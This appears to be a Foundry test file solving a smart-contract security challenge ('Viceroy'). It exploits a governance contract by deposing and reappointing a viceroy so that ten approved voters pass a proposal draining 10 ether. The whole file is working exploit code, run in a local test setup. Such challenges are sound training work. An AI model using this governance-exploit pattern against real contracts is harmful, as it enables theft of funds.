// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Viceroy.sol";

contract ViceroyTest is Test {
    OligarchyNFT public oligarchyNFT;
    Governance public governance;
    address atacker;
    address viceroy;

    function setUp() public {
        atacker = vm.addr(1);
        viceroy = vm.addr(2);

        vm.prank(atacker);
        oligarchyNFT = new OligarchyNFT(atacker);
        vm.deal(atacker, 10 ether);
        governance = new Governance{value: 10 ether}(oligarchyNFT);
    }

    function testAttack() public {
        bytes memory proposal = abi.encodeWithSelector(
            CommunityWallet.exec.selector,
            viceroy,
            "",
            10 ether
        );
        vm.prank(atacker);
        governance.appointViceroy(viceroy, 1);
        vm.prank(viceroy);
        governance.createProposal(viceroy, proposal);
        uint256 proposalId = uint256(keccak256(proposal));

        for (uint256 i = 0; i < 5; i++) {
            vm.prank(viceroy);
            governance.approveVoter(vm.addr(3 + i));
            vm.prank(vm.addr(3 + i));
            governance.voteOnProposal(proposalId, true, viceroy);
        }

        vm.prank(atacker);
        governance.deposeViceroy(viceroy, 1);
        vm.prank(atacker);
        governance.appointViceroy(viceroy, 1);

        for (uint256 i = 0; i < 5; i++) {
            vm.prank(viceroy);
            governance.approveVoter(vm.addr(8 + i));
            vm.prank(vm.addr(8 + i));
            governance.voteOnProposal(proposalId, true, viceroy);
        }

        (uint256 votes, ) = governance.proposals(proposalId);
        assertEq(votes, 10);

        governance.executeProposal(proposalId);

        assertEq(address(viceroy).balance, 10 ether);
    }
}
